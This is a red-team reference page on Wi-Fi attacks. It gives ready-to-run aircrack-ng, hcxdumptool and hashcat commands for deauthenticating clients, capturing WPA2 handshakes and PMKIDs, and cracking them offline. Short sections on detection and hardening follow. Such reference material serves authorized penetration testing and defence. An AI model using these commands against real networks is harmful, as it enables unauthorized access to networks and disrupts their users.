---
title: "Wi-Fi attacks"
category: "red-team"
tags: ["wireless", "wifi"]
platform: "agnostic"
mitre: ["T1200"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Wi-Fi attacks

## TL;DR
WPA2-PSK: capture the handshake (or PMKID) → offline crack. WPA2-Enterprise: evil twin + capturing MSCHAPv2. Only on your own / authorized networks.

## Setup
```bash
sudo airmon-ng start wlan0        # monitor mode -> wlan0mon
sudo airodump-ng wlan0mon         # recon of networks/clients
```

## WPA2-PSK handshake
```bash
# Listen on the specific network's channel
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
# Deauth to force reconnect (handshake)
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# Crack
hashcat -m 22000 cap.hc22000 rockyou.txt
```

## PMKID (clientless)
```bash
hcxdumptool -i wlan0mon -o pmkid.pcapng
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt
```

## Detection (Blue Team)
- WIDS/WIPS: deauth flood frames, rogue AP / evil twin (same SSID, different BSSID).
- Unusual deauth from non-AP sources.

## Mitigation / Hardening
- **WPA3** (SAE — resistant to offline crack), 802.11w (Protected Management Frames — blocks deauth).
- Strong PSK (20+ random) or 802.1X with server certificate validation on the client side.
- WIPS, guest segmentation.

## Sources
- [Aircrack-ng](https://www.aircrack-ng.org/) · [hashcat mode 22000](https://hashcat.net/wiki/)
